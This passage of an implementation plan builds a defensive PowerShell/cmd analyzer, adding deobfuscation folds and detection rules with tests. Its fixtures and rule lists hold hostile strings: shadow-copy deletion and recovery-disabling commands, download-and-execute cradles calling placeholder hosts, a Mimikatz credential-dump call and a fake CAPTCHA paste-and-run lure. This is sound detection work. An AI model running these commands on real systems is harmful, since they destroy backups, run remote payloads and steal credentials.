Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): fold -f format-operator over literal args"
```

---

### Task 10: `-replace` / `.Replace()` fold with ReDoS guard

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts` (append)

**Interfaces:**
- Produces: `export function foldReplace(text: string): string` — folds `'aXb' -replace 'X','Y'` when the pattern is metacharacter-free (plain substitution only).

- [ ] **Step 1: Write the failing test**

```typescript
describe('resolve — -replace fold with ReDoS guard (review 2.5)', () => {
  it('folds a plain-substring -replace', () => {
    expect(resolve("'IqqEqqX' -replace 'qq',''")).toContain('IEX')
  })
  it('does NOT fold a regex-metachar -replace (ReDoS guard) — left untouched', () => {
    const t = "'aaa' -replace '(a+)+',''"
    expect(resolve(t)).toContain('-replace')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts -t "replace fold"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```typescript
const REGEX_METACHAR = /[.\\^$*+?()[\]{}|]/

/** Fold `'subject' -replace 'pat','rep'` → the substituted literal, ONLY when
 *  `pat` is metacharacter-free (treated as plain substitution). Anything
 *  regex-fancy is skipped and left as residue — a hostile paste must never
 *  hand our own analyzer a catastrophic regex (ReDoS guard, spec §5). */
export function foldReplace(text: string): string {
  return text.replace(
    /'((?:[^']|'')*)'\s*-replace\s*'((?:[^']|'')*)'\s*,\s*'((?:[^']|'')*)'/gi,
    (whole, subj: string, pat: string, rep: string) => {
      const p = pat.replace(/''/g, "'")
      if (!p || REGEX_METACHAR.test(p)) return whole
      const s = subj.replace(/''/g, "'").split(p).join(rep.replace(/''/g, "'"))
      return `'${s.replace(/'/g, "''")}'`
    },
  )
}
```

Chain into `resolve()`:

```typescript
    const next = foldConcat(foldReplace(foldFormat(foldCharArray(resolveVars(cur)))))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): fold plain-substring -replace with a ReDoS guard"
```

---

### Task 11: String-reversal fold

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts` (append)

**Interfaces:**
- Produces: `export function foldReverse(text: string): string` — folds the `-join $s[-1..-N]` / `[array]::Reverse` reversal idioms over a literal.

- [ ] **Step 1: Write the failing test**

```typescript
describe('resolve — string reversal (review 2.5)', () => {
  it("folds a char-index reversal join over a literal", () => {
    // 'XEI'[-1..-3] -join '' → 'IEX'
    expect(resolve("('XEI'[-1..-3] -join '')")).toContain('IEX')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts -t "reversal"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```typescript
/** Fold `'literal'[-1..-N] -join ''` → the reversed literal. Literal subject
 *  only; a variable subject is left untouched. */
export function foldReverse(text: string): string {
  return text.replace(
    /'((?:[^']|'')*)'\s*\[\s*-1\s*\.\.\s*-\d+\s*\]\s*-join\s*(?:''|"")/gi,
    (_m, subj: string) => {
      const s = subj.replace(/''/g, "'")
      const rev = [...s].reverse().join('')
      return `'${rev.replace(/'/g, "''")}'`
    },
  )
}
```

Chain into `resolve()`:

```typescript
    const next = foldConcat(foldReverse(foldReplace(foldFormat(foldCharArray(resolveVars(cur))))))
```

- [ ] **Step 4: Run test to verify it passes + full Phase-2 gate**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Then: `npm --prefix web run build && cd web && npx vitest run ../shared && npx vitest run src`
Expected: all green.

- [ ] **Step 5: Commit + note-taking**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): fold string-reversal assembly over literals"
```

Then invoke `nt` for a Phase-2 `docs/HANDOFF.md` block.

---

## Phase 3 — Detection gaps

### Task 12: T1490 shadow/recovery-tamper rule + bullet

**Files:**
- Modify: `shared/analyzer/techniques.ts` (add a rule to `RULES`), `shared/analyzer/bullets.ts` (add a bullet rule)
- Test: `shared/analyzer/__tests__/techniques.test.ts`, `characterization.test.ts` (append)

**Interfaces:**
- Consumes: `hasAll`/`hasAny`/`triggerFor` helpers (in techniques.ts scope).
- Produces: a `shadow-recovery-tamper` rule, `baseSpecificity: 'near-dispositive'`; a `shadow-delete` bullet in the `evade`/`execute` family.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/techniques.test.ts
import { classify, buildContext } from '../techniques'
const sig = (s: string) => classify(buildContext(s, [], 'unknown')).map((x) => x.id)

describe('T1490 shadow/recovery tamper (review 2.4)', () => {
  it('fires on vssadmin delete shadows', () => {
    expect(sig('vssadmin delete shadows /all /quiet')).toContain('shadow-recovery-tamper')
  })
  it('fires on wmic shadowcopy delete', () => {
    expect(sig('wmic shadowcopy delete')).toContain('shadow-recovery-tamper')
  })
  it('fires on bcdedit recoveryenabled no', () => {
    expect(sig('bcdedit /set {default} recoveryenabled no')).toContain('shadow-recovery-tamper')
  })
  it('does NOT fire on a benign vssadmin list shadows', () => {
    expect(sig('vssadmin list shadows')).not.toContain('shadow-recovery-tamper')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "shadow"`
Expected: FAIL — rule does not exist.

- [ ] **Step 3: Write minimal implementation**

Add to the `RULES` array in `techniques.ts` (after `defender-tamper`, keeping table order intentional):

```typescript
  {
    id: 'shadow-recovery-tamper',
    label: 'shadow-copy / recovery destruction',
    techniqueIds: ['T1490'],
    baseSpecificity: 'near-dispositive',
    upgradesWith: [],
    test(ctx) {
      // Destructive verb must co-occur with its object — a bare `vssadmin list`
      // is benign admin work. Pasted one-liner context: no legitimate use.
      const del =
        (hasAny(ctx, ['vssadmin']) && hasAny(ctx, ['delete shadows', 'resize shadowstorage'])) ||
        (hasAny(ctx, ['wmic']) && hasAll(ctx, ['shadowcopy', 'delete'])) ||
        (hasAny(ctx, ['wbadmin']) && hasAny(ctx, ['delete catalog', 'delete systemstatebackup'])) ||
        (hasAny(ctx, ['bcdedit']) && hasAny(ctx, ['recoveryenabled no', 'bootstatuspolicy ignoreallfailures']))
      if (del) return { hit: true, trigger: triggerFor(ctx, ['delete shadows', 'shadowcopy', 'recoveryenabled', 'delete catalog']) }
      return { hit: false }
    },
  },
```

Add a bullet rule in `bullets.ts` `RULES` (family `evade`):

```typescript
  {
    id: 'shadow-delete',
    requiredFacts: ['signal: shadow-recovery-tamper'],
    family: 'evade',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'shadow-recovery-tamper')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Destroys', text: 'Deletes volume shadow copies / disables recovery — destroys ransomware rollback' }
    },
  },
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts && npx vitest run ../shared/analyzer/__tests__/characterization.test.ts`
Expected: PASS. (Because base is near-dispositive, `deriveCharacterization` now emits a red "high-confidence malicious" for sample 3 alongside AMSI — verify no characterization test regresses; update the AMSI+shadow expectation in `review-samples.test.ts` if present.)

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/bullets.ts shared/analyzer/__tests__/techniques.test.ts
git commit -m "feat(analyzer): detect T1490 shadow-copy/recovery destruction"
```

---

### Task 13: Download-to-disk-then-execute cradle

**Files:**
- Modify: `shared/analyzer/techniques.ts` (extend detection with a sibling rule), `shared/analyzer/bullets.ts` (bullet)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (append)

**Interfaces:**
- Produces: a `disk-dropper` rule, `baseSpecificity: 'strong'`, `upgradesWith: ['evasion-cluster', 'defender-tamper']`.

- [ ] **Step 1: Write the failing test**

```typescript
describe('download-to-disk-then-exec dropper (review 2.2)', () => {
  it('fires on DownloadFile + Start-Process', () => {
    expect(sig("(New-Object Net.WebClient).DownloadFile('http://e/a.exe','a.exe'); Start-Process a.exe")).toContain('disk-dropper')
  })
  it('does NOT fire on a bare download to disk with no exec', () => {
    expect(sig("Invoke-WebRequest http://e/update.zip -OutFile update.zip")).not.toContain('disk-dropper')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "dropper"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Add to `RULES` (after `download-cradle`):

```typescript
  {
    id: 'disk-dropper',
    label: 'download-to-disk then execute',
    techniqueIds: ['T1105', 'T1059.001'],
    baseSpecificity: 'strong',
    upgradesWith: ['evasion-cluster', 'defender-tamper', 'clickfix'],
    test(ctx) {
      const toDisk = hasAny(ctx, ['downloadfile', '-outfile', 'start-bitstransfer', 'curl -o', 'wget -o']) ||
        (hasAny(ctx, ['certutil']) && hasAny(ctx, ['-urlcache', '-split']))
      const exec = hasAny(ctx, ['start-process', 'saps', 'invoke-item', 'ii ']) || /(?:^|[;&|]\s*)&?\s*['"]?[^'"\s]+\.exe\b/i.test(ctx.text)
      if (toDisk && exec) return { hit: true, trigger: triggerFor(ctx, ['downloadfile', '-outfile', 'start-process']) }
      return { hit: false }
    },
  },
```

Add a bullet (family `execute`):

```typescript
  {
    id: 'disk-drop-exec',
    requiredFacts: ['signal: disk-dropper'],
    family: 'execute',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'disk-dropper')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Executes', text: 'Downloads a file to disk and executes it' }
    },
  },
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/bullets.ts shared/analyzer/__tests__/techniques.test.ts
git commit -m "feat(analyzer): detect download-to-disk-then-execute droppers"
```

---

### Task 14: ClickFix trait-gating (stop the over-fire)

**Files:**
- Modify: `shared/analyzer/techniques.ts:219-239` (the `clickfix` rule)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (append)

**Interfaces:**
- Produces: `clickfix` no longer fires on `hiddenFetchIex` alone — requires a real paste-and-run trait.

- [ ] **Step 1: Write the failing test**

```typescript
describe('ClickFix trait-gating (review 2.4)', () => {
  it('a plain -enc/-nop/-w download cradle is NOT ClickFix', () => {
    expect(sig("powershell -nop -w hidden IEX (New-Object Net.WebClient).DownloadString('http://x/a')")).not.toContain('clickfix')
  })
  it('a real fake-CAPTCHA lure IS ClickFix', () => {
    expect(sig("# verify you are human, press win+r\npowershell -nop -w hidden IEX (iwr http://x/a)")).toContain('clickfix')
  })
  it('conhost --headless still fires ClickFix', () => {
    expect(sig('conhost --headless powershell -enc AAAA')).toContain('clickfix')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "trait-gating"`
Expected: FAIL — the plain cradle currently fires ClickFix via `hiddenFetchIex`.

- [ ] **Step 3: Write minimal implementation**

In the `clickfix` rule (techniques.ts:233), remove `hiddenFetchIex` from the standalone fire condition — it must now co-occur with a real trait. Replace the decision block:

```typescript
      const realTrait = headless || hta || decoy
      // `hiddenFetchIex` alone is a download-cradle, NOT paste-and-run — it only
      // counts toward ClickFix alongside a genuine lure/headless/hta trait.
      if (realTrait) {
        const decoyTrigger = decoyPhrases.find((p) => present(ctx, p)) ?? (verifyDecoy ? '--verify' : undefined)
        const trigger = headless ? '--headless' : decoyTrigger ?? triggerFor(ctx, [...FETCH, 'mshta'])
        return { hit: true, trigger }
      }
      return { hit: false }
```

(The `hiddenFetchIex` const may now be unused — delete its declaration at techniques.ts:224 to satisfy `tsc -b`.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: PASS. Update any existing ClickFix positive test that relied on a plain cradle to add a lure trait.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/__tests__/techniques.test.ts
git commit -m "fix(analyzer): ClickFix requires a real paste-and-run trait, not a bare cradle"
```

---

### Task 15: Offensive-tool-name rule + bullet

**Files:**
- Modify: `shared/analyzer/techniques.ts`, `shared/analyzer/bullets.ts`
- Test: `shared/analyzer/__tests__/techniques.test.ts`

**Interfaces:**
- Produces: an `offensive-tool` rule, `baseSpecificity: 'near-dispositive'`.

- [ ] **Step 1: Write the failing test**

```typescript
describe('offensive-tool naming (spec §6)', () => {
  it('fires on Invoke-Mimikatz -DumpCreds', () => {
    expect(sig('Invoke-Mimikatz -DumpCreds')).toContain('offensive-tool')
  })
  it('does not fire on a benign string containing "user"', () => {
    expect(sig('Get-LocalUser')).not.toContain('offensive-tool')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "offensive-tool"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Add to `RULES`:

```typescript
  {
    id: 'offensive-tool',
    label: 'named offensive tool',
    techniqueIds: ['T1003', 'T1059.001'],
    baseSpecificity: 'near-dispositive',
    upgradesWith: [],
    test(ctx) {
      if (hasAny(ctx, ['invoke-mimikatz', 'sekurlsa::', 'dumpcreds', 'rubeus', 'invoke-kerberoast', 'safetykatz'])) {
        return { hit: true, trigger: triggerFor(ctx, ['invoke-mimikatz', 'sekurlsa::', 'rubeus', 'dumpcreds']) }
      }
      return { hit: false }
    },
  },
```

Add a bullet (family `execute`):

```typescript
  {
    id: 'offensive-tool-run',
    requiredFacts: ['signal: offensive-tool'],
    family: 'execute',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'offensive-tool')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { name: s.trigger } }
    },
    render(m) {
      return { verb: 'Runs', text: `Runs a named offensive/credential-theft tool (${m.vars.name})` }
    },
  },
```

- [ ] **Step 4: Run test + full Phase-3 gate**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Then: `npm --prefix web run build && cd web && npx vitest run ../shared && npx vitest run src`
Expected: all green. Update `review-samples.test.ts` `#6` to also assert `r.characterization?.level === 'high-confidence-malicious'` (decoded Mimikatz now characterizes).

- [ ] **Step 5: Commit + note-taking**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/bullets.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/review-samples.test.ts
git commit -m "feat(analyzer): characterize named offensive tools (mimikatz/rubeus/…)"
```

Then invoke `nt` for a Phase-3 `docs/HANDOFF.md` block.

---

## Phase 4 — cmd reassembly + robustness + IOC hygiene

### Task 16: cmd `set`/`%var%`/`%COMSPEC:~%` reassembly

**Files:**
- Create: `shared/analyzer/cmdvars.ts`
- Modify: `shared/analyzer/preprocess.ts:53-57` (`extractCmdBody`)
- Test: `shared/analyzer/__tests__/cmdvars.test.ts`, `preprocess.test.ts` (append)

**Interfaces:**
- Consumes: nothing.
- Produces: `export function reassembleCmdVars(text: string): { text: string; changed: boolean }`. Called from `extractCmdBody` AFTER `deobfuscateCaret`.

- [ ] **Step 1: Write the failing test**

```typescript
// shared/analyzer/__tests__/cmdvars.test.ts
import { describe, it, expect } from 'vitest'
import { reassembleCmdVars } from '../cmdvars'

describe('reassembleCmdVars (review 2.5)', () => {
  it('reassembles set x=power & set y=shell & %x%%y%', () => {
    const r = reassembleCmdVars('set x=power&&set y=shell&&%x%%y% -c whoami')
    expect(r.text.toLowerCase()).toContain('powershell')
    expect(r.changed).toBe(true)
  })
  it('handles quoted set "x=..."', () => {
    expect(reassembleCmdVars('set "x=cmd"&&%x% /c dir').text.toLowerCase()).toContain('cmd /c dir')
  })
  it('resolves %COMSPEC:~n,m% substrings when COMSPEC is set', () => {
    const r = reassembleCmdVars('set COMSPEC=C:\\Windows\\System32\\cmd.exe&&%COMSPEC:~-7%')
    expect(r.text.toLowerCase()).toContain('cmd.exe')
  })
  it('leaves a bare %PATH% untouched (no reassembly)', () => {
    expect(reassembleCmdVars('echo %PATH%').changed).toBe(false)
  })
  it('is bounded — a var map over 64 entries does not spin', () => {
    const many = Array.from({ length: 200 }, (_, i) => `set v${i}=${i}`).join('&')
    expect(() => reassembleCmdVars(many)).not.toThrow()
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/cmdvars.test.ts`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```typescript
// shared/analyzer/cmdvars.ts
//
// cmd.exe set/%var% reassembly (spec §7). Runs ONLY from preprocess.ts's cmd
// branch, AFTER caret de-obfuscation — never on PowerShell text. Straight-line,
// depth-1 reference expansion, var map capped so a hostile `set` chain can't
// spin the analyzer.

const MAX_VARS = 64

/** Parse straight-line `set VAR=VALUE` (and quoted `set "VAR=VALUE"`), then
 *  substitute `%VAR%` and `%VAR:~n,m%` references depth-1. Returns the
 *  reassembled text and whether anything changed (a signal for the caller). */
export function reassembleCmdVars(text: string): { text: string; changed: boolean } {
  const vars = new Map<string, string>()
  const setRe = /\bset\s+(?:"([A-Za-z_][\w]*)=([^"]*)"|([A-Za-z_][\w]*)=([^&|<>\r\n]*))/gi
  let m: RegExpExecArray | null
  while ((m = setRe.exec(text)) !== null) {
    if (vars.size >= MAX_VARS) break
    const name = (m[1] ?? m[3] ?? '').toLowerCase()
    const value = m[2] ?? m[4] ?? ''
    if (name) vars.set(name, value.trim())
  }
  if (!vars.size) return { text, changed: false }

  const expand = (name: string, spec?: string): string | null => {
    const v = vars.get(name.toLowerCase())
    if (v === undefined) return null
    if (!spec) return v
    // %VAR:~n,m% — n may be negative (from end); m optional, may be negative.
    const sm = spec.match(/^~(-?\d+)(?:,(-?\d+))?$/)
    if (!sm) return v
    const n = Number(sm[1])
    const start = n < 0 ? Math.max(v.length + n, 0) : n
    if (sm[2] === undefined) return v.slice(start)
    const len = Number(sm[2])
    return len < 0 ? v.slice(start, v.length + len) : v.slice(start, start + len)
  }

  let changed = false
  const out = text.replace(/%([A-Za-z_][\w]*)((?::~-?\d+(?:,-?\d+)?)?)%/g, (whole, name: string, spec: string) => {
    const rep = expand(name, spec ? spec.slice(1) : undefined)
    if (rep === null) return whole
    changed = true
    return rep
  })
  return { text: out, changed }
}
```

Wire into `preprocess.ts`'s `extractCmdBody` (lines 53-57):

```typescript
function extractCmdBody(input: string): string {
  const m = input.match(/\/(?:c|k)\s+(.*)$/is)
  const body = m ? m[1] : input
  const de = deobfuscateCaret(body)
  return reassembleCmdVars(de).text.trim()
}
```

Add the import at the top of `preprocess.ts`:

```typescript
import { reassembleCmdVars } from './cmdvars'
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/cmdvars.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/cmdvars.ts shared/analyzer/preprocess.ts shared/analyzer/__tests__/cmdvars.test.ts
git commit -m "feat(analyzer): reassemble cmd set/%var% and %COMSPEC:~% obfuscation"
```

---

### Task 17: cmd-var-obfuscation signal (surface even a half-resolved case)

**Files:**
- Modify: `shared/analyzer/preprocess.ts` (return `cmdReassembled` flag), `shared/analyzer/report.ts` (thread it into a flag), `shared/analyzer/techniques.ts` (rule)
- Test: `shared/analyzer/__tests__/techniques.test.ts` (append)

**Interfaces:**
- Simplest path with no type churn: detect the obfuscation directly in the rule from the corpus. Produces a `cmd-var-obfuscation` weak rule.

- [ ] **Step 1: Write the failing test**

```typescript
describe('cmd-var-obfuscation surfaced as a signal (review 2.5)', () => {
  it('a set/%var% reassembled command carries the obfuscation signal', () => {
    // preprocess reassembles it; the raw input still carries the set/%var% shape,
    // which analyze() keeps in the corpus (input is corpus[0]).
    const ids = sig('cmd /c "set x=power&&set y=shell&&%x%%y% -c whoami"')
    expect(ids).toContain('cmd-var-obfuscation')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts -t "cmd-var-obfuscation"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Add to `RULES` (weak, informational — like the `wsh-*` limit rules):

```typescript
  {
    id: 'cmd-var-obfuscation',
    label: 'cmd variable-substitution obfuscation',
    techniqueIds: ['T1140', 'T1027'],
    baseSpecificity: 'weak',
    upgradesWith: ['cmd-cradle', 'download-cradle'],
    test(ctx) {
      // The reassembly-shape tell: a `set X=…` followed by a `%X%` reference.
      const m = ctx.text.match(/\bset\s+"?([A-Za-z_][\w]*)=/i)
      if (m && new RegExp(`%${m[1]}[:%]`, 'i').test(ctx.text)) {
        return { hit: true, trigger: triggerFor(ctx, [`set ${m[1]}=`, `%${m[1]}%`]) }
      }
      return { hit: false }
    },
  },
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/techniques.test.ts`
Expected: PASS. Update `review-samples.test.ts` `#4` to assert the inner cradle now decodes (cmd re-entry works) + carries this signal.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/techniques.ts shared/analyzer/__tests__/techniques.test.ts shared/analyzer/__tests__/review-samples.test.ts
git commit -m "feat(analyzer): surface cmd variable-substitution obfuscation as a signal"
```

---

### Task 18: Debounce input + input size cap

**Files:**
- Create: `shared/analyzer-ui/useDebounced.ts`
- Modify: `web/src/routes/PowerShellAnalyzer.tsx:10-11`, `shared/analyzer-ui/index.ts`, `shared/analyzer/report.ts` (size cap in `analyze()`)
- Test: `shared/analyzer-ui/__tests__/useDebounced.test.ts`, `shared/analyzer/__tests__/report.test.ts` (append)

**Interfaces:**
- Produces: `export function useDebounced<T>(value: T, ms: number): T`; `analyze()` caps input at 64 KB and emits a truncation opaque layer past it.

- [ ] **Step 1: Write the failing tests**

```typescript
// shared/analyzer-ui/__tests__/useDebounced.test.ts
import { describe, it, expect } from 'vitest'
import { renderHook, act } from '@testing-library/react'
import { useDebounced } from '../useDebounced'

describe('useDebounced', () => {
  it('returns the initial value immediately, then the latest after the delay', async () => {
    const { result, rerender } = renderHook(({ v }) => useDebounced(v, 50), { initialProps: { v: 'a' } })
    expect(result.current).toBe('a')
    rerender({ v: 'b' })
    expect(result.current).toBe('a') // not yet
    await act(() => new Promise((r) => setTimeout(r, 70)))
    expect(result.current).toBe('b')
  })
})
```

```typescript
// append to shared/analyzer/__tests__/report.test.ts
describe('analyze — input size cap (review 2.6)', () => {
  it('caps a huge paste and reports truncation honestly', async () => {
    const huge = 'A'.repeat(70_000)
    const r = await analyze(huge)
    expect(r.layers.some((l) => l.state === 'opaque' && /truncated/i.test(l.residual?.note ?? ''))).toBe(true)
  })
})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd web && npx vitest run ../shared/analyzer-ui/__tests__/useDebounced.test.ts ../shared/analyzer/__tests__/report.test.ts -t "size cap"`
Expected: FAIL (module missing; no truncation layer).

- [ ] **Step 3: Write minimal implementation**

```typescript
// shared/analyzer-ui/useDebounced.ts
import { useEffect, useState } from 'react'

/** Debounce a rapidly-changing value (analyzer input). Makes usePsAnalysis's
 *  "debounced-by-caller" contract true — the analyzer no longer re-tokenizes
 *  the whole corpus on every keystroke. */
export function useDebounced<T>(value: T, ms: number): T {
  const [debounced, setDebounced] = useState(value)
  useEffect(() => {
    const id = setTimeout(() => setDebounced(value), ms)
    return () => clearTimeout(id)
  }, [value, ms])
  return debounced
}
```

Export it from `shared/analyzer-ui/index.ts`:

```typescript
export { useDebounced } from './useDebounced'
```

Use it in `PowerShellAnalyzer.tsx`:

```tsx
import { AnalyzerResult, usePsAnalysis, useDebounced } from '@socdesk/shared/analyzer-ui'
// ...
  const [input, setInput] = useState(readLookupQuery)
  const state = usePsAnalysis(useDebounced(input, 200))
```

Add the size cap at the very top of `analyze()` in `report.ts` (right after line 104's `preprocess`, adjust to cap the raw input first):

```typescript
export async function analyze(input: string): Promise<AnalysisResult> {
  const MAX_INPUT = 64 * 1024
  let truncatedNote: string | null = null
  if (input.length > MAX_INPUT) {
    truncatedNote = `input truncated for analysis — ${Math.round((input.length - MAX_INPUT) / 1024)} KB not scanned`
    input = input.slice(0, MAX_INPUT)
  }
  const outer = preprocess(input)
  // ... unchanged ...
```

Then, in the residue block added in Task 2, also push the truncation layer/bullet:

```typescript
  if (truncatedNote) {
    layers.push({ index: layers.length, transform: 'input truncated', text: null, state: 'opaque', residual: { bytes: 0, entropy: 0, note: truncatedNote } })
    bullets.push({ order: bullets.length + 1, verb: 'Note', text: `${truncatedNote} — treat as opaque and escalate.`, confidence: 'opaque', iocs: [], techniqueIds: [] })
  }
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd web && npx vitest run ../shared/analyzer-ui/__tests__/useDebounced.test.ts ../shared/analyzer/__tests__/report.test.ts`
Expected: PASS. (If `@testing-library/react`'s `renderHook` is unavailable, assert the debounce via a plain timer-based test instead — check `web/package.json` devDeps first.)

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer-ui/useDebounced.ts shared/analyzer-ui/index.ts web/src/routes/PowerShellAnalyzer.tsx shared/analyzer/report.ts shared/analyzer-ui/__tests__/useDebounced.test.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): debounce input and cap analysis size honestly"
```

---

### Task 19: Bound inflate() output (decode-bomb guard)

**Files:**
- Modify: `shared/analyzer/fold.ts:35-54`
- Test: `shared/analyzer/__tests__/fold.test.ts` (append)

**Interfaces:**
- Produces: `inflate()` returns `null` once decompressed output exceeds 2 MiB.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/fold.test.ts
describe('inflate — output bound (review 2.6)', () => {
  it('returns null when decompressed output exceeds the 2 MiB cap', async () => {
    // 8 MiB of zeros gzips tiny but inflates past the cap.
    const cs = new CompressionStream('gzip')
    const big = new Uint8Array(8 * 1024 * 1024)
    const gz = new Uint8Array(await new Response(new Blob([big]).stream().pipeThrough(cs)).arrayBuffer())
    expect(await inflate(gz)).toBeNull()
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts -t "output bound"`
Expected: FAIL — currently returns the full 8 MiB buffer.

- [ ] **Step 3: Write minimal implementation**

Replace `decompress` (fold.ts:35-45) to read incrementally with a cap:

```typescript
const MAX_INFLATE = 2 * 1024 * 1024 // 2 MiB — decode-bomb guard (mirrors resolve.ts)

async function decompress(bytes: Uint8Array, format: 'gzip' | 'deflate-raw'): Promise<Uint8Array | null> {
  try {
    const ds = new DecompressionStream(format)
    const stream = new Blob([bytes as BlobPart]).stream().pipeThrough(ds)
    const reader = stream.getReader()
    const chunks: Uint8Array[] = []
    let total = 0
    for (;;) {
      const { value, done } = await reader.read()
      if (done) break
      total += value.length
      if (total > MAX_INFLATE) { await reader.cancel(); return null }
      chunks.push(value)
    }
    const out = new Uint8Array(total)
    let off = 0
    for (const c of chunks) { out.set(c, off); off += c.length }
    return out
  } catch {
    return null
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/fold.test.ts`
Expected: PASS (existing inflate tests + the bound).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/fold.ts shared/analyzer/__tests__/fold.test.ts
git commit -m "fix(analyzer): bound inflate() output to guard against decode bombs"
```

---

### Task 20: IOC over-extraction hygiene

**Files:**
- Modify: `shared/analyzer/extract.ts:14,43-47`
- Test: `shared/analyzer/__tests__/extract.test.ts` (append)

**Interfaces:**
- Produces: widened `BINARY_EXT_DENYLIST` + a .NET-namespace prefix guard so lowercase member-access and data-file names stop yielding bogus domain IOCs.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/extract.test.ts
describe('IOC hygiene (review 2.7)', () => {
  const scan = (t: string) => extractIocs([{ index: 0, text: t }]).map((i) => i.raw)
  it('does not extract a data.json OutFile as a domain', () => {
    expect(scan("Invoke-WebRequest http://x.test/a -OutFile data.json")).not.toContain('data.json')
  })
  it('does not extract lowercase system.io.memorystream as a domain', () => {
    expect(scan('[system.io.memorystream]::new()')).not.toContain('system.io.memorystream')
  })
  it('still extracts a real domain', () => {
    expect(scan('http://evil.example.com/a')).toContain('evil.example.com')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/extract.test.ts -t "hygiene"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

Widen the denylist (extract.ts:14):

```typescript
const BINARY_EXT_DENYLIST = /\.(?:exe|dll|sys|bat|cmd|scr|ocx|cpl|msi|vbs|ps1|js|hta|json|xml|txt|log|csv|dat|tmp|ini|cfg)$/i
```

Add a .NET-namespace guard next to the existing domain filters (extract.ts:46-47):

```typescript
      if (type === 'domain' && /[A-Z]/.test(raw)) continue
      if (type === 'domain' && BINARY_EXT_DENYLIST.test(raw)) continue
      if (type === 'domain' && /^(?:system|net|io|text|management|microsoft|reflection|runtime)\./i.test(raw)) continue
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/extract.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

